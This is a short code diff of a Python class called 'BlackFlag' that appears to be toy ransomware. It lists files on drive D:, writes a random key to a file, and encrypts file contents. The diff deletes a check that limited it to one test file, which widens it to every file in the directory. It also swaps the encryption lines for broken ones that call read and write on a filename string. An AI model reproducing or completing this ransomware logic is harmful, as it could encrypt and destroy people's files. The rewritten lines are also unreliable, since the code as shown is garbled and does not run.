@@ -1,5 +1,5 @@
 import os
-import random 
+import random
 import string
 
 class BlackFlag:
@@ -17,16 +17,13 @@ class BlackFlag:
             global files
             global file 
             files = []
-            for file in os.listdir('D:'):
-                if file != 'Hello.txt':
-                    continue
-                
+            for file in os.listdir('D:'):                
                 files.append(file)
                 print(files)
                 with open('thekey', 'wb') as thekey:
                     thekey.write(RandomKey)
                     
                 for file in files:
-                    with open(file, 'rb') as thefile:
-                        contents = thefile.read()
-                        contentsEncrypted = BlackFlag(RandomKey).Encryption(contents)
+                    open(file, 'rb')
+                    contents = file.read()
+                    contentsEncrypted = file.write(RandomKey)
